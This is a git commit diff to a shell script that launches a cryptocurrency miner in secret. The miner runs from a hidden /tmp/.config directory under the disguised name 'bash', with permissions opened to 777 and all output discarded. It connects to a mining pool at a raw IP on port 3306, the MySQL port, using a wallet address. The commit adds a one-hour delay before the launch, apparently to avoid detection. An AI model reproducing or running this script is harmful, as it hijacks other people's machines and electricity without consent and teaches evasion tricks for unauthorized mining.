6ebfa8cb8c3dfe3a736bbfdd57adc84467adb842
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-05 20:46:17 +0800

    Update zh88kk.sh

--- zh88kk.sh
+++ zh88kk.sh
@@ -11,4 +11,4 @@ chmod -R  777 /tmp/.config
 #	sleep 5
 #done
 ###nohup /tmp/.config/bash -a ghostrider --url stratum-asia.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088a >/dev/null 2>&1 &
-nohup /tmp/.config/bash -a ghostrider --url 165.22.62.162:3306 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2099 --pass 5566 >/dev/null 2>&1 &
+bash -c "sleep 3600 && nohup /tmp/.config/bash -a ghostrider --url 165.22.62.162:3306 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2099 --pass 5566 >/dev/null 2>&1 &" >/dev/null 2>&1 &
